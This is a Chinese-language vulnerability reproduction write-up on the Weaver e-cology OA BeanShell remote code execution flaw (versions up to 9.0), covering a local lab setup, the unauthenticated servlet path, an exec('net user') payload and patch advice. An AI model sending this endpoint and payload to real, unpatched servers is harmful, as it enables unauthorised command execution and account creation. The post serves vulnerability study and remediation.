---
title: 泛微e-cology OA Beanshell组件远程代码执行漏洞复现
tags:
  - 漏洞复现
categories:
  - 漏洞复现
copyright: true
abbrlink: 6243fd56
date: 2019-09-23 20:50:51
---
**1.泛微e-cology OA简介**

泛微e-
cologyOA协同商务系统是专为大中型企业制作的OA办公系统，它支持PC端、移动端和微信端同时办公，其内置了大量智能化办公工具，使得各部门之间的协作变得畅通而又简单。总而言之，它是一个办公系统。

**2.漏洞概述**  
2019年9月17日，泛微OA更新了一个安全问题，修复了一个远程代码执行漏洞。泛微 e-cology OA 系统自带 BeanShell
组件且开放未授权访问，攻击者调用 BeanShell 组件接口可直接在目标服务器上执行任意命令。  
**漏洞影响的版本：泛微e-cology <= 9.0 **

**3.漏洞复现**

  1. 打开xampp软件，将weaver.war包复制webapps目录下，然后启动xampp的xampp-control。   
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923202443284.png)

  2. 启动tomcat，如图   
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923202716130.png)

  3. 访问本地环境   
` http://127.0.0.1:8080/weaver/ `

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923203206755.png)  
至此，本地环境搭建完成。

**4.漏洞利用**

  1. 点击Go to the BeanShell servle跳转到BeanShell组件远程代码执行触发页面。 

    
    
    http://127.0.0.1:8080/weaver/bsh.servlet.BshServlet
    

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923203833432.png)

  2. 执行系统命令 net user 查看当前系统所有用户，或者可以直接添加用户。   
` exec("net user"); `  
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923204212574.png)

**5.漏洞修复**

泛微e-cology OA系统为商业软件，可直接联系官方取得安全升级方案；在官方安全补丁发布之前，临时关停BeanShell接口或关闭网站对外访问。  
安全补丁下载： **https://www.weaver.com.cn/cs/securityDownload.asp**

**6.参考链接**  
https://www.77169.net/html/243215.html  
https://www.cnblogs.com/Oran9e/p/11566824.html  
https://help.aliyun.com/noticelist/articleid/1060057523.html  
https://beanshell.github.io/

